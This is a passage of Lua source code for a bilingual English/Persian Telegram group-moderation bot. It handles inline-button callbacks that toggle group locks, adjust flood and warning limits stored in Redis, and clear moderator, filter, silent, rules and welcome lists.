              if not lang then
                get_alert(msg.cb_id, "Bots Locked")
              else
                get_alert(msg.cb_id, "\216\177\216\168\216\167\216\170 \217\135\216\167 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings(msg, matches[2])
          end
          if matches[1] == "lock_markdown" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Markdown Unlocked")
              else
                get_alert(msg.cb_id, "\217\129\217\136\217\134\216\170 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Markdown Locked")
              else
                get_alert(msg.cb_id, "\217\129\217\136\217\134\216\170 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings2(msg, matches[2])
          end
          if matches[1] == "lock_webpage" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Webpage Unlocked")
              else
                get_alert(msg.cb_id, "\216\181\217\129\216\173\216\167\216\170 \217\136\216\168 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Webpage Locked")
              else
                get_alert(msg.cb_id, "\216\181\217\129\216\173\216\167\216\170 \217\136\216\168 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings2(msg, matches[2])
          end
          if matches[1] == "lock_pin" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Pin Unlocked")
              else
                get_alert(msg.cb_id, "\216\179\217\134\216\172\216\167\217\130 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Pin Locked")
              else
                get_alert(msg.cb_id, "\216\179\217\134\216\172\216\167\217\130 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings2(msg, matches[2])
          end
          if matches[1] == "lock_MaxWords" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "MaxWords Unlocked")
              else
                get_alert(msg.cb_id, "\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "MaxWords Locked")
              else
                get_alert(msg.cb_id, "\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings2(msg, matches[2])
          end
          if matches[1] == "lock_botchat" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "BotChat Unlocked")
              else
                get_alert(msg.cb_id, "\218\134\216\170 \216\177\216\168\216\167\216\170 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "BotChat Locked")
              else
                get_alert(msg.cb_id, "\218\134\216\170 \216\177\216\168\216\167\216\170 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings2(msg, matches[2])
          end
          if matches[1] == "lock_fohsh" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "Fohsh Unlocked")
              else
                get_alert(msg.cb_id, "\217\129\216\173\216\180 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "Fohsh Locked")
              else
                get_alert(msg.cb_id, "\217\129\216\173\216\180 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings2(msg, matches[2])
          end
          if matches[1] == "lock_english" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "English Unlocked")
              else
                get_alert(msg.cb_id, "\216\167\217\134\218\175\217\132\219\140\216\179\219\140 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "English Locked")
              else
                get_alert(msg.cb_id, "\216\167\217\134\218\175\217\132\219\140\216\179\219\140 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings2(msg, matches[2])
          end
          if matches[1] == "lock_forcedinvite" then
            if redis:hget("GroupSettings:" .. matches[2], matches[1]) == "yes" then
              redis:hdel("GroupSettings:" .. matches[2], matches[1])
              if not lang then
                get_alert(msg.cb_id, "ForcedInvite Unlocked")
              else
                get_alert(msg.cb_id, "\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140 \216\168\216\167\216\178 \216\180\216\175")
              end
            else
              redis:hset("GroupSettings:" .. matches[2], matches[1], "yes")
              if not lang then
                get_alert(msg.cb_id, "ForcedInvite Locked")
              else
                get_alert(msg.cb_id, "\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140 \217\130\217\129\217\132 \216\180\216\175")
              end
            end
            GetSettings2(msg, matches[2])
          end
          function GetNumberSettings(msg, chat)
            NUM_MSG_MAX = tonumber(redis:hget("GroupSettings:" .. chat, "num_msg_max")) or 5
            MaxWords = tonumber(redis:hget("GroupSettings:" .. chat, "MaxWords")) or 50
            MaxWarn = tonumber(redis:hget("GroupSettings:" .. chat, "MaxWarn")) or 5
            FloodTime = tonumber(redis:hget("GroupSettings:" .. chat, "FloodTime")) or 30
            ForcedInvite = tonumber(redis:hget("GroupSettings:" .. chat, "ForcedInvite")) or 2
            keyboard = {}
            if not lang then
              text = "`Please Use An item For Change Number:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\240\159\146\128 Number of Flood: " .. NUM_MSG_MAX,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "-5",
                    callback_data = "-5Flood:" .. chat
                  },
                  {
                    text = "-1",
                    callback_data = "-1Flood:" .. chat
                  },
                  {
                    text = "+1",
                    callback_data = "+1Flood:" .. chat
                  },
                  {
                    text = "+5",
                    callback_data = "+5Flood:" .. chat
                  }
                },
                {
                  {
                    text = "\240\159\149\176 Flood Time: " .. FloodTime,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "-5",
                    callback_data = "-5FloodTime:" .. chat
                  },
                  {
                    text = "-1",
                    callback_data = "-1FloodTime:" .. chat
                  },
                  {
                    text = "+1",
                    callback_data = "+1FloodTime:" .. chat
                  },
                  {
                    text = "+5",
                    callback_data = "+5FloodTime:" .. chat
                  }
                },
                {
                  {
                    text = "\226\154\160\239\184\143 Max Warn: " .. MaxWarn,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "-5",
                    callback_data = "-5MaxWarn:" .. chat
                  },
                  {
                    text = "-1",
                    callback_data = "-1MaxWarn:" .. chat
                  },
                  {
                    text = "+1",
                    callback_data = "+1MaxWarn:" .. chat
                  },
                  {
                    text = "+5",
                    callback_data = "+5MaxWarn:" .. chat
                  }
                },
                {
                  {
                    text = "\240\159\148\160 Max Words: " .. MaxWords,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "-100",
                    callback_data = "-100MaxWords:" .. chat
                  },
                  {
                    text = "-10",
                    callback_data = "-10MaxWords:" .. chat
                  },
                  {
                    text = "+10",
                    callback_data = "+10MaxWords:" .. chat
                  },
                  {
                    text = "+100",
                    callback_data = "+100MaxWords:" .. chat
                  }
                },
                {
                  {
                    text = "\240\159\154\183 Forced invite: " .. ForcedInvite,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "-5",
                    callback_data = "-5Forced:" .. chat
                  },
                  {
                    text = "-1",
                    callback_data = "-1Forced:" .. chat
                  },
                  {
                    text = "+1",
                    callback_data = "+1Forced:" .. chat
                  },
                  {
                    text = "+5",
                    callback_data = "+5Forced:" .. chat
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            else
              text = "`\217\132\216\183\217\129\216\167 \219\140\218\169 \216\168\216\174\216\180 \216\177\216\167 \216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \216\185\216\175\216\175 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\240\159\146\128 \216\170\216\185\216\175\216\167\216\175 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140: " .. NUM_MSG_MAX,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "-5",
                    callback_data = "-5Flood:" .. chat
                  },
                  {
                    text = "-1",
                    callback_data = "-1Flood:" .. chat
                  },
                  {
                    text = "+1",
                    callback_data = "+1Flood:" .. chat
                  },
                  {
                    text = "+5",
                    callback_data = "+5Flood:" .. chat
                  }
                },
                {
                  {
                    text = "\240\159\149\176 \216\178\217\133\216\167\217\134 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140: " .. FloodTime,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "-5",
                    callback_data = "-5FloodTime:" .. chat
                  },
                  {
                    text = "-1",
                    callback_data = "-1FloodTime:" .. chat
                  },
                  {
                    text = "+1",
                    callback_data = "+1FloodTime:" .. chat
                  },
                  {
                    text = "+5",
                    callback_data = "+5FloodTime:" .. chat
                  }
                },
                {
                  {
                    text = "\226\154\160\239\184\143 \216\173\216\175\216\167\218\169\216\171\216\177 \216\167\216\174\216\183\216\167\216\177: " .. MaxWarn,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "-5",
                    callback_data = "-5MaxWarn:" .. chat
                  },
                  {
                    text = "-1",
                    callback_data = "-1MaxWarn:" .. chat
                  },
                  {
                    text = "+1",
                    callback_data = "+1MaxWarn:" .. chat
                  },
                  {
                    text = "+5",
                    callback_data = "+5MaxWarn:" .. chat
                  }
                },
                {
                  {
                    text = "\240\159\148\160 \216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170 \216\175\216\177 \216\172\217\133\217\132\217\135: " .. MaxWords,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "-100",
                    callback_data = "-100MaxWords:" .. chat
                  },
                  {
                    text = "-10",
                    callback_data = "-10MaxWords:" .. chat
                  },
                  {
                    text = "+10",
                    callback_data = "+10MaxWords:" .. chat
                  },
                  {
                    text = "+100",
                    callback_data = "+100MaxWords:" .. chat
                  }
                },
                {
                  {
                    text = "\240\159\154\183 \216\170\216\185\216\175\216\167\216\175 \216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140: " .. ForcedInvite,
                    callback_data = "NoProcess:" .. chat
                  }
                },
                {
                  {
                    text = "-5",
                    callback_data = "-5Forced:" .. chat
                  },
                  {
                    text = "-1",
                    callback_data = "-1Forced:" .. chat
                  },
                  {
                    text = "+1",
                    callback_data = "+1Forced:" .. chat
                  },
                  {
                    text = "+5",
                    callback_data = "+5Forced:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "NumberSettings" then
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "-5Flood" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "num_msg_max")) or 5
            if 1 > String - 5 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif 1 <= String - 5 then
              redis:hset("GroupSettings:" .. matches[2], "num_msg_max", String - 5)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "-1Flood" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "num_msg_max")) or 5
            if 1 > String - 1 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif 1 <= String - 1 then
              redis:hset("GroupSettings:" .. matches[2], "num_msg_max", String - 1)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "+1Flood" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "num_msg_max")) or 5
            if String + 1 > 200 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif String + 1 <= 200 then
              redis:hset("GroupSettings:" .. matches[2], "num_msg_max", String + 1)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "+5Flood" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "num_msg_max")) or 5
            if String + 5 > 200 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif String + 5 <= 200 then
              redis:hset("GroupSettings:" .. matches[2], "num_msg_max", String + 5)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "-5MaxWarn" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWarn")) or 5
            if 2 > String - 5 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif 2 <= String - 5 then
              redis:hset("GroupSettings:" .. matches[2], "MaxWarn", String - 5)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "-1MaxWarn" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWarn")) or 5
            if 2 > String - 1 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif 2 <= String - 1 then
              redis:hset("GroupSettings:" .. matches[2], "MaxWarn", String - 1)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "+1MaxWarn" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWarn")) or 5
            redis:hset("GroupSettings:" .. matches[2], "MaxWarn", String + 1)
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "+5MaxWarn" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWarn")) or 5
            redis:hset("GroupSettings:" .. matches[2], "MaxWarn", String + 5)
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "-5FloodTime" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "FloodTime")) or 30
            if String - 5 < 5 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif 5 <= String - 5 then
              redis:hset("GroupSettings:" .. matches[2], "FloodTime", String - 5)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "-1FloodTime" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "FloodTime")) or 30
            if String - 1 < 5 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif String - 1 >= 5 then
              redis:hset("GroupSettings:" .. matches[2], "FloodTime", String - 1)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "+1FloodTime" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "FloodTime")) or 30
            redis:hset("GroupSettings:" .. matches[2], "FloodTime", String + 1)
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "+5FloodTime" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "FloodTime")) or 30
            redis:hset("GroupSettings:" .. matches[2], "FloodTime", String + 5)
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "-100MaxWords" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWords")) or 50
            if String - 100 < 10 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif String - 100 >= 10 then
              redis:hset("GroupSettings:" .. matches[2], "MaxWords", String - 100)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "-10MaxWords" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWords")) or 50
            if String - 10 < 10 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif 10 <= String - 10 then
              redis:hset("GroupSettings:" .. matches[2], "MaxWords", String - 10)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "+10MaxWords" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWords")) or 50
            redis:hset("GroupSettings:" .. matches[2], "MaxWords", String + 10)
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "+100MaxWords" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "MaxWords")) or 50
            redis:hset("GroupSettings:" .. matches[2], "MaxWords", String + 100)
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "-5Forced" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "ForcedInvite")) or 2
            if 1 > String - 5 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif 1 <= String - 5 then
              redis:hset("GroupSettings:" .. matches[2], "ForcedInvite", String - 5)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "-1Forced" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "ForcedInvite")) or 2
            if 1 > String - 1 then
              if not lang then
                get_alert(msg.cb_id, "Input Number is Not Correct!")
              else
                get_alert(msg.cb_id, "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!")
              end
            elseif 1 <= String - 1 then
              redis:hset("GroupSettings:" .. matches[2], "ForcedInvite", String - 1)
            end
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "+1Forced" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "ForcedInvite")) or 2
            redis:hset("GroupSettings:" .. matches[2], "ForcedInvite", String + 1)
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "+5Forced" then
            String = tonumber(redis:hget("GroupSettings:" .. matches[2], "ForcedInvite")) or 2
            redis:hset("GroupSettings:" .. matches[2], "ForcedInvite", String + 5)
            GetNumberSettings(msg, matches[2])
          end
          if matches[1] == "Cleans" then
            if not is_owner(matches[2], msg.from.id) then
              return ErrorAccess
            else
              keyboard = {}
              if not lang then
                text = "`Please Use An item For Clean it:`"
                keyboard.inline_keyboard = {
                  {
                    {
                      text = "Allow List",
                      callback_data = "InfoAllow:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanAllow:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "Filter List",
                      callback_data = "InfoFilterList:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanFilterList:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "Silent List",
                      callback_data = "InfoSilentList:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanSilentList:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "Group Moderators",
                      callback_data = "InfoMods:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanMods:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "Group Rules",
                      callback_data = "InfoRules:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanRules:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "Group Welcome",
                      callback_data = "InfoWelcome:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanWelcome:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "\226\135\177 Back To Manager",
                      callback_data = "Manager:" .. matches[2]
                    }
                  }
                }
              else
                text = "`\217\132\216\183\217\129\216\167 \219\140\218\169 \216\168\216\174\216\180 \216\177\216\167 \216\168\216\177\216\167\219\140 \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\162\217\134 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:`"
                keyboard.inline_keyboard = {
                  {
                    {
                      text = "\217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178",
                      callback_data = "InfoAllow:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanAllow:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "\217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177",
                      callback_data = "InfoFilterList:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanFilterList:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "\217\132\219\140\216\179\216\170 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\179\216\167\218\169\216\170",
                      callback_data = "InfoSilentList:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanSilentList:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "\217\133\216\175\219\140\216\177\216\167\217\134 \218\175\216\177\217\136\217\135",
                      callback_data = "InfoMods:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanMods:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "\217\130\217\136\216\167\217\134\219\140\217\134 \218\175\216\177\217\136\217\135",
                      callback_data = "InfoRules:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanRules:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \218\175\216\177\217\136\217\135",
                      callback_data = "InfoWelcome:" .. matches[2]
                    },
                    {
                      text = "\240\159\151\145",
                      callback_data = "CleanWelcome:" .. matches[2]
                    }
                  },
                  {
                    {
                      text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                      callback_data = "Manager:" .. matches[2]
                    }
                  }
                }
              end
              edit_inline(msg.message_id, text, keyboard)
            end
          end
          if matches[1] == "CleanMods" and is_owner(matches[2], msg.from.id) then
            if data[tostring(matches[2])] then
              if next(data[tostring(matches[2])].mods) == nil then
                if not lang then
                  return "Moderator List is Empty!"
                else
                  return "\217\132\219\140\216\179\216\170 \217\133\216\175\219\140\216\177\216\167\217\134 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175!"
                end
              end
              for k, v in pairs(data[tostring(matches[2])].mods) do
                data[tostring(matches[2])].mods[tostring(k)] = nil
                save_data("./data/moderation.json", data)
              end
              if not lang then
                return "Cleaned!"
              else
                return "\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175!"
              end
            elseif not lang then
              return "Group is Not installed!"
            else
              return "\218\175\216\177\217\136\217\135 \217\134\216\181\216\168 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170!"
            end
          end
          if matches[1] == "CleanAllow" and is_owner(matches[2], msg.from.id) then
            listWord = redis:smembers("AllowFrom~" .. matches[2])
            listUser = redis:smembers("AllowUserFrom~" .. matches[2])
            if #listWord == 0 and #listUser == 0 then
              if not lang then
                get_alert(msg.cb_id, "Allow List is Empty!")
              else
                get_alert(msg.cb_id, "\217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175!")
              end
            end
            redis:del("AllowFrom~" .. matches[2])
            redis:del("AllowUserFrom~" .. matches[2])
            if not lang then
              get_alert(msg.cb_id, "Cleaned!")
            else
              get_alert(msg.cb_id, "\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175!")
            end
          end
          if matches[1] == "CleanFilterList" and is_owner(matches[2], msg.from.id) then
            filterlist = redis:smembers("GroupFilterList:" .. matches[2])
            if #filterlist == 0 then
              if not lang then
                get_alert(msg.cb_id, "Filter List is Empty!")
              else
                get_alert(msg.cb_id, "\217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175!")
              end
            else
              redis:del("GroupFilterList:" .. matches[2])
              if not lang then
                get_alert(msg.cb_id, "Cleaned!")
              else
                get_alert(msg.cb_id, "\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175!")
              end
            end
          end
          if matches[1] == "CleanRules" and is_owner(matches[2], msg.from.id) then
            if not redis:hget("GroupSettings:" .. matches[2], "rules") then
              if not lang then
                get_alert(msg.cb_id, "Rules is Empty!")
              else
                get_alert(msg.cb_id, "\217\130\217\136\216\167\217\134\219\140\217\134 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175!")
              end
            end
            redis:hdel("GroupSettings:" .. matches[2], "rules")
            if not lang then
              get_alert(msg.cb_id, "Cleaned!")
            else
              get_alert(msg.cb_id, "\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175!")
            end
          end
          if matches[1] == "CleanWelcome" and is_owner(matches[2], msg.from.id) then
            if not redis:get("GroupWelcome" .. matches[2]) then
              if not lang then
                get_alert(msg.cb_id, "Welcome is Empty!")
              else
                get_alert(msg.cb_id, "\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175!")
              end
            end
            redis:del("GroupWelcome" .. matches[2])
            if not lang then
              get_alert(msg.cb_id, "Cleaned!")
            else
              get_alert(msg.cb_id, "\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175!")
            end
          end
          if matches[1] == "CleanSilentList" and is_owner(matches[2], msg.from.id) then
            GetSilentList = redis:smembers("GroupSilentUsers:" .. matches[2])
            if #GetSilentList == 0 then
              if not lang then
                get_alert(msg.cb_id, "Silent List is Empty!")
              else
                get_alert(msg.cb_id, "\217\132\219\140\216\179\216\170 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\179\216\167\218\169\216\170 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175!")
              end
            end
            redis:del("GroupSilentUsers:" .. matches[2])
            if not lang then
              get_alert(msg.cb_id, "Cleaned!")
            else
              get_alert(msg.cb_id, "\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175!")
            end
          end
          if matches[1] == "Info" then
            keyboard = {}
            if not lang then
              text = "`Please Use a Button For open it:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\240\159\155\130 Rules",
                    callback_data = "InfoRules:" .. matches[2]
                  },
                  {
                    text = "\240\159\151\163 Welcome",
                    callback_data = "InfoWelcome:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\240\159\140\144 Group Link",
                    callback_data = "InfoLink:" .. matches[2]
                  },
                  {
                    text = "\240\159\145\174\226\128\141 Moderators",
                    callback_data = "InfoMods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\156\133 Allow List",
                    callback_data = "InfoAllow:" .. matches[2]
                  },
                  {
                    text = "\226\154\160\239\184\143 Filter List",
                    callback_data = "InfoFilterList:" .. matches[2]
                  }
                },
                {
                  {
